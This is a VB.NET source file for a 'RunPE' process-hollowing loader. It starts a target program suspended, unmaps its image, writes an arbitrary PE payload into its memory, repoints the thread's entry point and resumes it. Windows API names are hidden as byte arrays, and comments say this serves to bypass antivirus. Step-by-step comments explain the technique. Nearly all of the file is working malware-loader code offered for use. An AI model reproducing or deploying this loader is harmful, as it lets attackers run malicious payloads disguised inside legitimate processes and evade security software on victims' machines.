Imports System.Runtime.InteropServices
Imports System.Text

Public Class RunPE

    Private Shared kernel32 As String = BytesToStr(New Byte() {107, 101, 114, 110, 101, 108, 51, 50})
    Private Shared LoadLibraryA As String = BytesToStr(New Byte() {76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 65})
    Private Delegate Function LoadLibraryAParameters(ByVal name As String) As IntPtr
    Private Shared ReadOnly LoadLibrary As LoadLibraryAParameters = CreateApi(Of LoadLibraryAParameters)(kernel32, LoadLibraryA)

    Private Shared Function CreateApi(Of DelegateInstance)(ByVal name As String, ByVal method As String) As DelegateInstance
        Return CType(DirectCast(Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(CType(GetProcAddress(CLng(GetInternalModuleBaseAddr(name)), method), IntPtr), GetType(DelegateInstance)), Object), DelegateInstance)
    End Function

    Private Shared Function GetInternalModuleBaseAddr(ByVal ModuleName As String) As IntPtr

        If ModuleName.Contains(".dll") = False Then ModuleName = ModuleName & ".dll"
        Dim ModuleBaseAddress As IntPtr = Nothing
        For Each ProcessModule As System.Diagnostics.ProcessModule In System.Diagnostics.Process.GetCurrentProcess.Modules
            If ProcessModule.ModuleName.ToLower = ModuleName Then Return ProcessModule.BaseAddress
        Next
        Return LoadLibrary(ModuleName)

    End Function

    Private Shared Function ReadByteArray(ByVal Address As IntPtr, ByVal Size As Integer) As Byte()

        Dim ReturnArray(Size - 1) As Byte
        System.Runtime.InteropServices.Marshal.Copy(Address, ReturnArray, 0, Size)
        Return ReturnArray

    End Function

    Private Shared Function GetProcAddress(ByVal ModuleAddress As Int64, ByVal Export As String) As Int64

        Dim IExportDir() As Byte = Nothing
        If IntPtr.Size = 4 Then IExportDir = ReadByteArray(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + &H3C, IntPtr)) + &H78, IntPtr)) + 24, IntPtr), 16)
        If IntPtr.Size = 8 Then IExportDir = ReadByteArray(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + System.Runtime.InteropServices.Marshal.ReadInt32(CType(ModuleAddress + &H3C, IntPtr)) + &H88, IntPtr)) + 24, IntPtr), 16)
        For i As Integer = 0 To BitConverter.ToInt32(IExportDir, 0) Step 1
            Dim tpAddress As Integer = System.Runtime.InteropServices.Marshal.ReadInt32(CType(BitConverter.ToInt32(IExportDir, 8) + ModuleAddress + i * 4, IntPtr))
            Dim ApiString As String = System.Text.Encoding.ASCII.GetString(ReadByteArray(CType(ModuleAddress + tpAddress, IntPtr), 64)).Split(CChar(vbNullChar))(0)
            Dim Ord As Integer = BitConverter.ToInt16(ReadByteArray(CType(BitConverter.ToInt32(IExportDir, 12) + ModuleAddress + i * 2, IntPtr), 2), 0)
            If ApiString = Export Then Return BitConverter.ToInt32(ReadByteArray(CType(BitConverter.ToInt32(IExportDir, 4) + ModuleAddress + (Ord * 4), IntPtr), 4), 0) + ModuleAddress
        Next
        Return Nothing

    End Function

    Private Delegate Function CP(ByVal applicationName As String, ByVal commandLine As String, ByVal processAttributes As IntPtr, ByVal threadAttributes As IntPtr, ByVal inheritHandles As Boolean, ByVal creationFlags As UInteger, ByVal environment As IntPtr, ByVal currentDirectory As String, ByRef startupInfo As STARTUP_INFORMATION, ByRef processInformation As PROCESS_INFORMATION) As Boolean
    Private Delegate Function GTC(ByVal thread As IntPtr, ByVal context As Integer()) As Boolean
    Private Delegate Function W64GTC(ByVal thread As IntPtr, ByVal context As Integer()) As Boolean
    Private Delegate Function STC(ByVal thread As IntPtr, ByVal context As Integer()) As Boolean
    Private Delegate Function W64STC(ByVal thread As IntPtr, ByVal context As Integer()) As Boolean
    Private Delegate Function RPM(ByVal process As IntPtr, ByVal baseAddress As Integer, ByRef buffer As Integer, ByVal bufferSize As Integer, ByRef bytesRead As Integer) As Boolean
    Private Delegate Function WPM(ByVal process As IntPtr, ByVal baseAddress As Integer, ByVal buffer As Byte(), ByVal bufferSize As Integer, ByRef bytesWritten As Integer) As Boolean
    Private Delegate Function NTU(ByVal process As IntPtr, ByVal baseAddress As Integer) As Integer
    Private Delegate Function VAE(ByVal handle As IntPtr, ByVal address As Integer, ByVal length As Integer, ByVal type As Integer, ByVal protect As Integer) As Integer
    Private Delegate Function RT(ByVal handle As IntPtr) As Integer

    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Private Structure PROCESS_INFORMATION
        Public ProcessHandle As IntPtr
        Public ThreadHandle As IntPtr
        Public ProcessId As UInteger
        Public ThreadId As UInteger
    End Structure

    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Private Structure STARTUP_INFORMATION
        Public Size As UInteger
        Public Reserved1 As String
        Public Desktop As String
        Public Title As String

        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=36)>
        Public Misc As Byte()

        Public Reserved2 As IntPtr
        Public StdInput As IntPtr
        Public StdOutput As IntPtr
        Public StdError As IntPtr
    End Structure



    Private Shared Function HandleRun(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean

        'Step 3
        'We retrieve the name of the API we are going to have to call, this method was used for bypass some AV some years ago
        Dim K32 As String = BytesToStr(New Byte() {107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108})                'Kernel32.dll
        Dim NTD As String = BytesToStr(New Byte() {110, 116, 100, 108, 108, 46, 100, 108, 108})                             'Ntdll.dll
        Dim CP As String = BytesToStr(New Byte() {67, 114, 101, 97, 116, 101, 80, 114, 111, 99, 101, 115, 115, 65})         'CreateProcess
        Dim GTC As String = BytesToStr(New Byte() {71, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116}) 'GetThreadContext
        Dim STC As String = BytesToStr(New Byte() {83, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116}) 'SetThreadContext
        Dim W64GTC As String = BytesToStr(New Byte() {87, 111, 119, 54, 52, 71, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116}) 'Wow64GetThreadContext
        Dim W64STC As String = BytesToStr(New Byte() {87, 111, 119, 54, 52, 83, 101, 116, 84, 104, 114, 101, 97, 100, 67, 111, 110, 116, 101, 120, 116}) 'Wow64SetThreadContext
        Dim RPM As String = BytesToStr(New Byte() {82, 101, 97, 100, 80, 114, 111, 99, 101, 115, 115, 77, 101, 109, 111, 114, 121})                      '....
        Dim WPM As String = BytesToStr(New Byte() {87, 114, 105, 116, 101, 80, 114, 111, 99, 101, 115, 115, 77, 101, 109, 111, 114, 121})
        Dim NTU As String = BytesToStr(New Byte() {78, 116, 85, 110, 109, 97, 112, 86, 105, 101, 119, 79, 102, 83, 101, 99, 116, 105, 111, 110})
        Dim VAE As String = BytesToStr(New Byte() {86, 105, 114, 116, 117, 97, 108, 65, 108, 108, 111, 99, 69, 120})
        Dim RT As String = BytesToStr(New Byte() {82, 101, 115, 117, 109, 101, 84, 104, 114, 101, 97, 100})

        'Step 4
        'Here, the API are resolved at runtime by a custom GetProcAdress 
        Dim CreateProcess As CP = CreateApi(Of CP)(K32, CP)
        Dim GetThreadContext As GTC = CreateApi(Of GTC)(K32, GTC)
        Dim Wow64GetThreadContext As W64GTC = CreateApi(Of W64GTC)(K32, W64GTC)
        Dim SetThreadContext As STC = CreateApi(Of STC)(K32, STC)
        Dim Wow64SetThreadContext As W64STC = CreateApi(Of W64STC)(K32, W64STC)
        Dim ReadProcessMemory As RPM = CreateApi(Of RPM)(K32, RPM)
        Dim WriteProcessMemory As WPM = CreateApi(Of WPM)(K32, WPM)
        Dim NtUnmapViewOfSection As NTU = CreateApi(Of NTU)(NTD, NTU)
        Dim VirtualAllocEx As VAE = CreateApi(Of VAE)(K32, VAE)
        Dim ResumeThread As RT = CreateApi(Of RT)(K32, RT)


        Dim ReadWrite As Integer
        Dim QuotedPath As String = String.Format("""{0}""", path)

        Dim SI As New STARTUP_INFORMATION
        Dim PI As New PROCESS_INFORMATION

        SI.Size = CUInt(Marshal.SizeOf(GetType(STARTUP_INFORMATION)))

        Try
            If Not String.IsNullOrEmpty(cmd) Then
                QuotedPath = QuotedPath & " " & cmd
            End If

            'Step 5 : we create a suspended process where the payload will be injected
            If Not CreateProcess(path, QuotedPath, IntPtr.Zero, IntPtr.Zero, False, 4, IntPtr.Zero, Nothing, SI, PI) Then Throw New Exception()

            Dim FileAddress As Integer = BitConverter.ToInt32(data, 60) 'We get the value of elf_new (used to find NtHeader)
            Dim ImageBase As Integer = BitConverter.ToInt32(data, FileAddress + 52) 'We get the image base of our payload

            Dim Context(179 - 1) As Integer
            Context(0) = 65538 'Context FULL

            'Step 6 : We check if our process is x86 or x64
            'Then we get the context of the Suspended Process created earlier
            If IntPtr.Size = 4 Then
                If Not GetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            Else
                If Not Wow64GetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            End If

            Dim Ebx As Integer = Context(41)
            Dim BaseAddress As Integer

            'Step 7 : We get the baseAdress of the Suspended Process by reading is memory at the Ebx + 8
            If Not ReadProcessMemory(PI.ProcessHandle, Ebx + 8, BaseAddress, 4, ReadWrite) Then Throw New Exception()

            'Step 8 : If the ImageBase of our payload is the same as the Suspended Process we need to unmap it to map our payload 
            If ImageBase = BaseAddress Then
                If Not NtUnmapViewOfSection(PI.ProcessHandle, BaseAddress) = 0 Then Throw New Exception()
            End If

            Dim SizeOfImage As Integer = BitConverter.ToInt32(data, FileAddress + 80) 'Get the Size of our payload
            Dim SizeOfHeaders As Integer = BitConverter.ToInt32(data, FileAddress + 84) 'Get the SizeHeader of our payload

            Dim AllowOverride As Boolean

            'Step 9 : Create a buffer into the Suspended Process at the ImageBase of our payload
            Dim NewImageBase As Integer = VirtualAllocEx(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64)

            'This is the only way to execute under certain conditions. However, it may show
            'an application error probably because things aren't being relocated properly.
            If Not compatible AndAlso NewImageBase = 0 Then
                AllowOverride = True
                NewImageBase = VirtualAllocEx(PI.ProcessHandle, 0, SizeOfImage, 12288, 64)
            End If

            If NewImageBase = 0 Then Throw New Exception()

            'Step 10 : Now, we write the Header bytes of our payload in the region created in the Step 9
            If Not WriteProcessMemory(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ReadWrite) Then Throw New Exception()

            Dim SectionOffset As Integer = FileAddress + 248 ' Get the address of Sections Header
            Dim NumberOfSections As Short = BitConverter.ToInt16(data, FileAddress + 6) 'Get the number of sections

            'Step 11 : We write all sections in the region created previously
            'After this, our payload is corectly mapped in the suspended process
            For I As Integer = 0 To NumberOfSections - 1
                Dim VirtualAddress As Integer = BitConverter.ToInt32(data, SectionOffset + 12)
                Dim SizeOfRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 16)
                Dim PointerToRawData As Integer = BitConverter.ToInt32(data, SectionOffset + 20)

                If Not SizeOfRawData = 0 Then
                    Dim SectionData(SizeOfRawData - 1) As Byte
                    Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length)

                    If Not WriteProcessMemory(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ReadWrite) Then Throw New Exception()
                End If

                SectionOffset += 40
            Next

            Dim PointerData As Byte() = BitConverter.GetBytes(NewImageBase)
            'Step 12 : We overwrite the BaseAddress of the PEB by the new ImageBase of our payload
            If Not WriteProcessMemory(PI.ProcessHandle, Ebx + 8, PointerData, 4, ReadWrite) Then Throw New Exception()

            Dim AddressOfEntryPoint As Integer = BitConverter.ToInt32(data, FileAddress + 40)

            If AllowOverride Then NewImageBase = ImageBase

            'Step 13 : We update EAX by the entry Point of our payload
            Context(44) = NewImageBase + AddressOfEntryPoint

            'Step 14 : Update the ContextThread
            If IntPtr.Size = 4 Then
                If Not SetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            Else
                If Not Wow64SetThreadContext(PI.ThreadHandle, Context) Then Throw New Exception()
            End If

            'Step 15 : Resume our suspended Process
            If ResumeThread(PI.ThreadHandle) = -1 Then Throw New Exception() 'spoted avast

        Catch
            Dim P As Process = Process.GetProcessById(CInt(PI.ProcessId))
            If P IsNot Nothing Then P.Kill()

            Return False
        End Try
        '    MsgBox("12")
        Return True
    End Function
    Public Shared Function Run(ByVal path As String, ByVal cmd As String, ByVal data As Byte(), ByVal compatible As Boolean) As Boolean
        For I As Integer = 1 To 5
            If HandleRun(path, cmd, data, compatible) Then 'Step 2 : We will try to run the RunPe 5 times in case of some error
            End If
            Return True
        Next

        Return False
    End Function

    Private Shared Function BytesToStr(ByVal input As Byte()) As String
        Return Encoding.Default.GetString(input)
    End Function
End Class
